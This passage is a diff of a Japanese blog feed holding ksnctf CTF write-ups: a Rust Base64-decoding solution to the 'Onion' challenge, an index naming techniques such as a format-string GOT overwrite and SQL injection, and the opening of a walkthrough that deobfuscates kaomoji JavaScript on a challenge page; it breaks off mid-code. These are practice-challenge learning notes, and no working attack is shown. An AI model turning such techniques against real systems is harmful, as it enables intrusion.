+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;_&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;c&quot;&gt;// uuencode&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;// の良い感じのが見当たらなかったので、ブラウザ等で変換してください。&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;// https://uic.jp/uuencode/&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_decode_cipher&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_u8&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;..&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;from_utf8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;onion_u8&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.to_vec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.unwrap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-----------&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{}-----------&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string_all&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.lines&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;.collect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;nd&quot;&gt;println!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{}&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string_all&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;onion_string_all&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;false&lt;/code&gt; については、出力形式を改行付き文字列にするか否かである。 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; は改行無しが望ましく、&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uuencode&lt;/code&gt; については改行が入っている方が望ましかったために、雑に bool 値を入れた。&lt;/p&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;get_decode_cipher&lt;/code&gt; を並べているのもなんとか整理したかったのだが、よく分からなかったので、これで良しとした。各自で高みを目指してください。&lt;/p&gt;
+
+&lt;h2 id=&quot;所感&quot;&gt;所感&lt;/h2&gt;
+&lt;p&gt;　最初はまったく手の付け方が分からなかったが、crypto ということで、腰を据えて頑張るぞと思って古典暗号から洗い直した。結局、公開鍵暗号については調べ切れていないが、無知の時よりは遥かによくなった。&lt;/p&gt;
+
+&lt;p&gt;　そこで、問題文を見直してみて、これは&lt;strong&gt;＜暗号文＞&lt;/strong&gt;が渡されているだけの問題であると判ずるに至った。&lt;/p&gt;
+
+&lt;p&gt;　通常、暗号化においては&lt;strong&gt;＜平文＞＜暗号文＞＜鍵＞&lt;/strong&gt;の三つがあり、これに加えて&lt;strong&gt;＜暗号化アルゴリズム＞&lt;/strong&gt;も重要となる。&lt;/p&gt;
+
+&lt;p&gt;　例えば、&lt;strong&gt;＜暗号文＞＜暗号化アルゴリズム＞&lt;/strong&gt;があれば&lt;strong&gt;＜鍵＞&lt;/strong&gt;をブルートフォースで仕留めることが可能だ。ショートカット法などアルゴリズムによってはより効率的な解き方があるだろう。&lt;/p&gt;
+
+&lt;p&gt;　しかし今回は、&lt;strong&gt;＜暗号文＞&lt;/strong&gt;のみであり、何をどうやっても&lt;strong&gt;＜平文＞&lt;/strong&gt;に辿り着けない。このことに気付き愕然とした。なぜならば、暗号解読の基本的な要素が不足している、即ちこれは暗号解読とは関係のない解き方をするのではないかとさえ思えてきたからである。&lt;/p&gt;
+
+&lt;p&gt;　また、改めて問題文を凝視してみると、どうにも違和感がある。やたら大文字が多いのだ。大文字が多いというのは普通ではない。暗号解読の時に見たいくつかの暗号文は16進数で構成されており大文字よりも数字の方が多かったのだ。問題文はまるでROT13のような古典暗号のようでありながら、そうではない。違和感を抱きつつもこの時は見過ごすしかなかった。&lt;/p&gt;
+
+&lt;p&gt;　手詰まりを感じたのだが、 crypto の分類としか思えないわけで、暗号解読について調べ切れていないところさっと見渡してみた。&lt;/p&gt;
+
+&lt;p&gt;　「暗号学的ハッシュ関数」という文字が目に入る。&lt;/p&gt;
+
+&lt;p&gt;　ハッシュ関数では大文字がこれほど現れない。だから関係ないだろうと高を括っていた。そうは言っても手詰まりなのだから何かしら情報が欲しかった。ぼおっと眺めていくと、「SHA-1」のwikiで衝撃が走る。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;SHA1(&quot;The quick brown fox jumps over the lazy dog&quot;)
+gives hexidecimal: 2fd4e1c6 7a2d28fc ed849ee1 bb76e739 1b93eb12
+gives Base64 binary to ASCII text encoding: L9ThxnotKPzthJ7hu3bnORuT6xI=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;  &lt;/div&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;　問題文に類似する文字列。そこには Base64 というエンコーディング方式の存在が記されていた。&lt;/p&gt;
+
+&lt;p&gt;　これをきっかけにして、今回の問題文を解くに至った。&lt;/p&gt;
+
+&lt;p&gt;　思い返してみると、暗号学的ハッシュ関数では&lt;strong&gt;＜鍵＞&lt;/strong&gt;を必要としない（必要とするものもあるらしいが）。基本的に&lt;strong&gt;＜平文＞＜暗号文＞&lt;/strong&gt;だけで良いのだ。即ち今回の問題の状況にぴったりと当てはまる。そして、Base64 を始めとするエンコーディング方式も同様の条件を通過する。&lt;/p&gt;
+
+&lt;p&gt;　暗号学的ハッシュ関数と一般的な暗号化アルゴリズムを比較すると、やはり別物なのだと改めて思う。明らかに後者の方がセキュリティとして堅牢だろう。&lt;/p&gt;
+
+&lt;p&gt;　本文では解説しなかったが一行76文字というのもBase64の、というよりはメールソフトの特徴らしい。正確にはMINEでそう決めたのだそうだ。問題文の一行が76文字であるということを数えたことは無駄ではなく、Base64である確証を強めてくれていた。&lt;/p&gt;
+
+&lt;p&gt;　意味不明な文字列であっても、意味付け可能な何かというのはやはり存在している。暗号解読の基礎知識も重要だが、目の前の暗号文の持つ特徴を正しく捉えることも重要だと感じる一問となった。&lt;/p&gt;
+
+&lt;p&gt;　とはいえ、ブロック暗号とかも調べたので、そうした問題に早く取り組みたいところではある。&lt;/p&gt;
+
+&lt;p&gt;　ところで、古典暗号を調べていた時にビックペン暗号というのに出会った。この暗号はとても美しかったので、良かった皆さんも見てみてくれたらと思います。&lt;/p&gt;
+
+&lt;p&gt;　いやはや遠回りをしてしまったが解けて良かった。&lt;/p&gt;
+
+&lt;p&gt;　ではではこの辺で。&lt;/p&gt;
+
+&lt;p&gt;　&lt;/p&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">目次(ネタバレ含む)</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/index.html" rel="alternate" type="text/html" title="目次(ネタバレ含む)" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/index</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/index.html">&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;No&lt;/th&gt;
+      &lt;th&gt;Title&lt;/th&gt;
+      &lt;th&gt;ジャンル&lt;/th&gt;
+      &lt;th&gt;解法&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;001&lt;/td&gt;
+      &lt;td&gt;Test Problem&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+      &lt;td&gt;-&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;002&lt;/td&gt;
+      &lt;td&gt;Easy Cipher&lt;/td&gt;
+      &lt;td&gt;crypto&lt;/td&gt;
+      &lt;td&gt;ROT13&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;003&lt;/td&gt;
+      &lt;td&gt;Crawling Chaos&lt;/td&gt;
+      &lt;td&gt;web&lt;/td&gt;
+      &lt;td&gt;解読？&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;004&lt;/td&gt;
+      &lt;td&gt;Villager A&lt;/td&gt;
+      &lt;td&gt;pwn&lt;/td&gt;
+      &lt;td&gt;Format String Bug を利用した GOT overwrite&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;005&lt;/td&gt;
+      &lt;td&gt;Onion&lt;/td&gt;
+      &lt;td&gt;crypto&lt;/td&gt;
+      &lt;td&gt;Base64, uuencode&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;006&lt;/td&gt;
+      &lt;td&gt;Login&lt;/td&gt;
+      &lt;td&gt;web&lt;/td&gt;
+      &lt;td&gt;SQLインジェクション&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;007&lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+      &lt;td&gt; &lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;</content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 003 Crawling Chaos</title><link href="/contents/tech/ctf_ksnctf/2021/05/18/003.html" rel="alternate" type="text/html" title="ksnctf 003 Crawling Chaos" /><published>2021-05-18T12:38:04+00:00</published><updated>2021-05-18T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/18/003</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/18/003.html">&lt;h2 id=&quot;ksnctf-003-crawling-chaos&quot;&gt;ksnctf 003 Crawling Chaos&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;問題公開日: 2012/05/24&lt;/li&gt;
+  &lt;li&gt;ジャンル: web&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;謎解き&quot;&gt;謎解き&lt;/h3&gt;
+
+&lt;p&gt;　正しい入力をすればFLAGを取得できそうな入力フォームがある。&lt;/p&gt;
+
+&lt;p&gt;　F12 を押して devloper tools を開いてソースコードを見てみると、目を疑う光景が広がっていた。&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ᆞωᆞ/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧうー&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ᆞωᆞ/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;にゃー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),....&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　入力フォームの挙動は javascript で書かれているはずであり、つまりは &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt; にあるはずなのだが、そこには愉快な顔文字が並んでいるだけであった。&lt;/p&gt;
+
+&lt;p&gt;　どうして動いているのかさっぱり分からないが、ともかくこれらが javascript と同等の働きをしていると考えないとサイトの挙動を説明できない。取っ掛かりの見当すらつかないのだが、これを解読するのが今回の問題と考えられる。&lt;/p&gt;
+
+&lt;p&gt;　カンマ区切りで改行してみると、幾分見やすくなった。&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ᆞωᆞ/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧうー&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ᆞωᆞ/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;にゃー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳にゃー&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧうー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;　&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;=&lt;/code&gt; を使っているわけだから、左辺に右辺を代入しているのだろう。&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(ᒧᆞωᆞ) = (/ᆞωᆞ/)&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hoge = 10&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;　みたいな関係があると想像してみる。そこでもしやと思った。&lt;/p&gt;
+
+&lt;p&gt;　仮に&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;(ᒧᆞωᆞ)&lt;/code&gt;が変数なのであれば、 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console.log&lt;/code&gt; で値を確認出来るのではないか、と。&lt;/p&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ᆞωᆞ/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧうー&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-!!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/ᆞωᆞ/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;にゃー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧうー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
+    &lt;span class=&quot;nx&quot;&gt;console&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;log&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳ᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;〳にゃー&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧᆞωᆞ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ᒧうー&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
